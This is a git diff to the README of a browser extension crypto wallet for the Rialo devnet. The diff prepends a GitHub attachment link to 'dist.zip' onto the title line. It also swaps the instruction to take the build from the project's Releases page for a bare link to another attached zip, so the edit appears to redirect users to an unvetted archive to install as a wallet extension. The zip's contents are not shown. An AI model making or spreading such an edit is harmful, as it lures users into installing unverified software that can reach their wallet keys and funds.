@@ -1,4 +1,4 @@
-# VOID Wallet
+[dist.zip](https://github.com/user-attachments/files/24811149/dist.zip)# VOID Wallet
 
 A secure browser extension wallet for the Rialo blockchain.
 
@@ -43,7 +43,8 @@ This wallet is designed exclusively for **Rialo Devnet** testing purposes:
 
 ## Installing the Latest Release
 
-Grab the latest `dist.zip` from [Releases](../../releases) and add it to your local Chrome profile using developer mode.
+Grab the latest `[dist.zip](https://github.com/user-attachments/files/24811151/dist.zip)` 
+
 
 ## Developing Locally
 
